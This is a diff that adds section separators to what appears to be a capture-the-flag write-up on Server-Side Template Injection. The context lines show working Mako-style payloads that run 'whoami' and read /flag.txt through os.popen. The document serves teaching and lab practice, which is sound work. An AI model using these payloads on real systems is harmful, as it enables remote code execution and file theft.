@@ -9,7 +9,7 @@
 **Server-Side Template Injection (SSTI)**
 The application is using a template engine that evaluates expressions inside `${...}` syntax.
 
-
+---
 
 ## Step-by-Step Exploitation
 
@@ -20,7 +20,7 @@ The payload `${...}` suggests the application is using a template engine that 
 
 
 
-
+---
 ### Step 2: Test for Code Execution
 
 **Payload used:**
@@ -34,7 +34,7 @@ ${self.module.cache.util.os.popen('whoami').read()}
 
 
 
-
+---
 ### Step 3: Read the Flag
 
 **First, identify the flag file name:**
@@ -53,6 +53,7 @@ ${self.module.cache.util.os.popen('cat /flag.txt').read()}
 **Result:** The contents of `/flag.txt` are displayed.
 
 
+---
 ### Step 4: Capture the Flag
 
 
